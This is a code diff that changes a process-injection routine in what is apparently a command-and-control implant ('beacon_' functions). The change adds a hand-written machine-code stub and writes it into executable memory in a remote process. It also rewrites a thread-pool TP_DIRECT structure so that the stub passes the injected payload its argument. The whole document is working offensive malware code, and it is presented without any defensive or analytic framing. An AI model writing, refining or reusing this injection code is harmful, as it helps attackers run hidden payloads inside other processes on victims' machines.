@@ -641,7 +641,27 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	HANDLE hProcess = context->hProcess;
 	DWORD pid = context->pid;
 
-	/* 2. TP_DIRECT */
+	/* 2. TP_DIRECT + arg-forwarding stub. TpDirectCallback invokes
+	 * Callback(direct, ...) - the stage entry would see the direct pointer
+	 * instead of its real argument. Fields +0x40/+0x48 are not touched by
+	 * the dispatch path, so stash payload/param there and point Callback at
+	 * a 13-byte stub: rax=[rcx+0x40]; rcx=[rcx+0x48]; jmp rax. */
+	unsigned char stubc[] = {
+		0x48, 0x8B, 0x41, 0x40,             /* mov rax, [rcx+0x40] payload  */
+		0x48, 0x8B, 0x49, 0x48,             /* mov rcx, [rcx+0x48] param    */
+		0xFF, 0xE0                          /* jmp rax                      */
+	};
+	unsigned char * stub = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, sizeof(stubc),
+	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+	if (stub == NULL) {
+		spawn_log("tpdirect: stub alloc failed gle=", (long)GetLastError());
+		return FALSE;
+	}
+	SIZE_T sgot = 0;
+	if (!beacon_WriteProcessMemory(hProcess, stub, stubc, sizeof(stubc), &sgot) || sgot != sizeof(stubc)) {
+		spawn_log("tpdirect: stub write failed gle=", (long)GetLastError());
+		return FALSE;
+	}
 	unsigned char * direct = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x60,
 	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (direct == NULL) {
@@ -652,7 +672,9 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		unsigned char buf[0x60];
 		memset(buf, 0, sizeof(buf));
 		*(unsigned int *)(buf + 0x00) = 1;                                   /* RefCount */
-		*(unsigned long long *)(buf + 0x38) = (unsigned long long)(size_t)lpStartAddress;
+		*(unsigned long long *)(buf + 0x38) = (unsigned long long)(size_t)stub;
+		*(unsigned long long *)(buf + 0x40) = (unsigned long long)(size_t)lpStartAddress;
+		*(unsigned long long *)(buf + 0x48) = (unsigned long long)(size_t)lpParameter;
 		SIZE_T got = 0;
 		if (!beacon_WriteProcessMemory(hProcess, direct, buf, sizeof(buf), &got) || got != sizeof(buf)) {
 			spawn_log("tpdirect: direct write failed gle=", (long)GetLastError());
